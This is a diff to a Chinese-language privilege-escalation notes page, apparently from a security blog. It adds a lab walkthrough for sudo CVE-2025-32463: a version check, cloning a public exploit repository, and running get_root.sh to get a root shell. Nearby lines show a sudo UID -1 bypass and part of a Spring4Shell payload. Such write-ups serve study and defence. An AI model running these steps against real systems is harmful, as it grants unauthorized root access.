@@ -5667,7 +5667,49 @@ class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
 </span></span></code></pre></div><p>下面是一些解释。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>ALL, !root<span style="color:#f92672">)</span> NOPASSWD: /bin/bash
 </span></span></code></pre></div><p>这将允许用户以另一个用户的身份执行任何命令，但理论上会阻止以超级用户的身份执行命令。如果指定 UID 为 -1，sudo 则会错误的将其读取为 0。这意味着指定 UID 为 -1 或 4294967295 时将以 sudo 身份执行命令。</p>
-<h3 id="sudo-apt">sudo apt</h3>
+<h3 id="cve-2025-32463">CVE-2025-32463</h3>
+<p>经过枚举发现靶机的 <code>sudo</code> 版本为 1.9.17，符合 <code>CVE-2025-32463</code> 的提权条件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:~$ sudo -V
+</span></span><span style="display:flex;"><span>Sudo version 1.9.17
+</span></span><span style="display:flex;"><span>Sudoers policy plugin version 1.9.17
+</span></span><span style="display:flex;"><span>Sudoers file grammar version <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span>Sudoers I/O plugin version 1.9.17
+</span></span><span style="display:flex;"><span>Sudoers audit plugin version 1.9.17
+</span></span></code></pre></div><p><code>CVE-2025-32463</code> 是 <code>sudo</code> 的一个关键本地权限提升漏洞，影响 sudo 1.9.14-1.9.17 版本，在 sudo 1.9.17p1 版本被修复，不影响 1.9.14 之前的旧版本。</p>
+<p>从 github 下载编译好的源码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>                                                                        
+</span></span><span style="display:flex;"><span>└─$ git clone https://github.com/MohamedKarrab/CVE-2025-32463.git
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>Cloning into <span style="color:#e6db74">&#39;CVE-2025-32463&#39;</span>...
+</span></span><span style="display:flex;"><span>remote: Enumerating objects: 58, <span style="color:#66d9ef">done</span>.      
+</span></span><span style="display:flex;"><span>remote: Counting objects: 100% <span style="color:#f92672">(</span>58/58<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Compressing objects: 100% <span style="color:#f92672">(</span>44/44<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Total <span style="color:#ae81ff">58</span> <span style="color:#f92672">(</span>delta 27<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">31</span> <span style="color:#f92672">(</span>delta 12<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>from 0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Receiving objects: 100% <span style="color:#f92672">(</span>58/58<span style="color:#f92672">)</span>, 69.65 KiB | 298.00 KiB/s, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>Resolving deltas: 100% <span style="color:#f92672">(</span>27/27<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span></code></pre></div><p>下载到靶机中运行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:/tmp$ ls -liah CVE-2025-32463/
+</span></span><span style="display:flex;"><span>total 28K
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">261</span> drwxrwxr-x  <span style="color:#ae81ff">5</span> ike  ike   <span style="color:#ae81ff">220</span> Feb <span style="color:#ae81ff">12</span> 06:04 .
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">1</span> drwxrwxrwt <span style="color:#ae81ff">29</span> root root  <span style="color:#ae81ff">620</span> Feb <span style="color:#ae81ff">12</span> 10:39 ..
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">317</span> drwxrwxr-x  <span style="color:#ae81ff">2</span> ike  ike   <span style="color:#ae81ff">140</span> Feb <span style="color:#ae81ff">12</span> 06:04 archs-dynamic
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">311</span> drwxrwxr-x  <span style="color:#ae81ff">2</span> ike  ike   <span style="color:#ae81ff">140</span> Feb <span style="color:#ae81ff">12</span> 06:04 archs-static
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">310</span> -rw-rw-r--  <span style="color:#ae81ff">1</span> ike  ike  2.5K Feb <span style="color:#ae81ff">12</span> 06:04 get_root.py
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">324</span> -rwxrwxr-x  <span style="color:#ae81ff">1</span> ike  ike  1.8K Feb <span style="color:#ae81ff">12</span> 06:04 get_root.sh
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">265</span> drwxrwxr-x  <span style="color:#ae81ff">8</span> ike  ike   <span style="color:#ae81ff">260</span> Feb <span style="color:#ae81ff">12</span> 06:04 .git
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">264</span> -rw-rw-r--  <span style="color:#ae81ff">1</span> ike  ike  4.4K Feb <span style="color:#ae81ff">12</span> 06:04 .gitignore
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">323</span> -rw-rw-r--  <span style="color:#ae81ff">1</span> ike  ike  1.1K Feb <span style="color:#ae81ff">12</span> 06:04 LICENSE
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">263</span> -rwxrwxr-x  <span style="color:#ae81ff">1</span> ike  ike   <span style="color:#ae81ff">989</span> Feb <span style="color:#ae81ff">12</span> 06:04 mkall-dynamic.sh
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">262</span> -rw-rw-r--  <span style="color:#ae81ff">1</span> ike  ike  1.7K Feb <span style="color:#ae81ff">12</span> 06:04 README.md
+</span></span></code></pre></div><p>运行获得 <code>root</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:/tmp/CVE-2025-32463$ ls
+</span></span><span style="display:flex;"><span>archs-dynamic  archs-static  get_root.py  get_root.sh  LICENSE  mkall-dynamic.sh  README.md
+</span></span><span style="display:flex;"><span>ike@expressway:/tmp/CVE-2025-32463$ ./get_root.sh 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected architecture: x86_64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Launching sudo with archs-dynamic payload …
+</span></span><span style="display:flex;"><span>root@expressway:/# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="sudo-apt">sudo apt</h3>
 <p>从此条开始下面数个提权演示命令参考 <a href="https://gtfobins.github.io">GTFOBins</a></p>
 <p>查看无需密码即可以 sudo 身份执行的命令。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
